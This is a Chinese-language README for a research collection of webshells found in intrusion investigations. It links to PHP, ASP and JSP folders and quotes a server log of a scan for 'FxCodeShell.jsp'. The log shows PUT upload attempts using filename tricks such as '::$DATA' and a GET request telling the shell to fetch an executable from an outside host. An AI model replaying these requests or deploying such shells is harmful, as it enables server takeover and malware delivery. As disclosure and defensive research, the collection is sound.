# webshell

几乎都是当年乙方入侵分析发现的后门。

- [PHP](https://github.com/JoyChou93/webshell/blob/master/PHP/README.md)
- [ASP](https://github.com/JoyChou93/webshell/blob/master/ASP/README.md)
- [JSP](https://github.com/JoyChou93/webshell/blob/master/JSP/README.md)

该项目的所有内容，只用来安全研究。请勿用作其他用途。

FxCodeShell.jsp 无意发现的，下面是扫我的日志。源码来源)(https://raw.githubusercontent.com/janbkrejci/TSRX/5cf9304f1a37a729ebf1fef23db011a2dce8a5bb/FxCodeShell.jsp%3A%3A%24DATA)
Not Found: /FxCodeShell.jsp 
[16/Mar/2019 13:34:00] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 404 2110
Not Found: /FxCodeShell.jsp::$DATA
[16/Mar/2019 13:34:00] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 404 2126
Not Found: /FxCodeShell.jsp/
[16/Mar/2019 13:34:00] "PUT /FxCodeShell.jsp/ HTTP/1.1" 404 2108
Not Found: /FxCodeShell.jsp
[16/Mar/2019 13:34:00] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 2185
